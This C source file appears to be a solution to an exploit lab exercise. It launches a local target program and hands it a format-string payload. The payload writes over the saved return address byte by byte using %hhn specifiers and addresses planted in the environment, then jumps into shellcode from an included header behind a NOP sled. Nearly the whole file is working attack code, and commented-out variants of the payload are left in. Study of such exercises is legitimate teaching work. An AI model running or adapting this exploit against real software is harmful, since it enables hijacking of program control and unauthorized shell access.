#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

#define NOP 0x90

int main(void)
{
    char *args[3];
    char *env[22];

    // Store important addresses gotten from GDB
    int ripAddr = 0x2021fe68;
    // Write 20 into RA, 21 into RA + 1...
    int formatStrAddr = 0x2021f960;
    int bufAddr = 0x2021fa60;

    // Set up arg list for execve call
    args[0] = TARGET; 
    args[1] = malloc(sizeof(char) * 256);
    args[2] = NULL;
    // Create attack string
    memset(args[1], NOP, 256);// Fill with NOP
    int i;
    for (i = 0; i < strlen(shellcode); ++i) {
        args[1][i] = shellcode[i];
    } // i ends at 45
    // <stackpop> <dummy addr pair * 4> <overwrite code>
//    char *attack = "%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u" //Stackpop
//                   "\x68\xfe\x21\x20\x00\x00\x00\x00"
//                   "\x69\xfe\x21\x20\x00\x00\x00\x00"
//                   "\x6a\xfe\x21\x20\x00\x00\x00\x00"
//                   "\x6b\xfe\x21\x20\x00\x00\x00\x00"
//                   "%32x%n" // 0x20 (32) to RA
//                   "%33x%n" // 0x21 (33) to RA + 1
//                   "%249x%n" // 0xf9 (249) to RA + 2
//                   "%96x%n"; // 0x60 (96) to RA + 3
//    strcpy(&args[1][60], attack);
    // strlen(arg) = 103 => 13 8 byte pointers in arg + 
    // Using direct parameter access
    char *attack = "%32x%20$hhn%33x%21$hhn%249x%22$hhn%96x%23$hhn\x00";
//    char *attack = "%32x|%19$u|%33x|%20$u|%249x|%21$u|%96x|%22$u\x00";
    strcpy(&args[1][60], attack);
    char *addr = "\x68\xfe\x21\x20";
    printf("strlen addr = %d", strlen(addr));
    
//    env[0] = malloc(sizeof(char) * 256);
//    memset(env[0], '\x00', 256);
    // Set up enviroment variable which holds our dummy addresses
    int j, addrCount;
    for (j = 0, addrCount = 0; j < 22; ++j) {
        if (((j + 2) % 4 == 0) && j > 3) {
            switch (addrCount) {
                case 0: 
                    env[j] = strdup(addr);
                    break;
                case 1:
                    env[j] = strdup("\x69\xfe\x21\x20");
                    break;
                case 2:
                    env[j] = strdup("\x6a\xfe\x21\x20");
                    break;
                case 3:
                    env[j] = strdup("\x6b\xfe\x21\x20");
                    break;
                default: break;
            }
            addrCount++;
        }      
        else
            env[j] = strdup("\x00");
    }

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
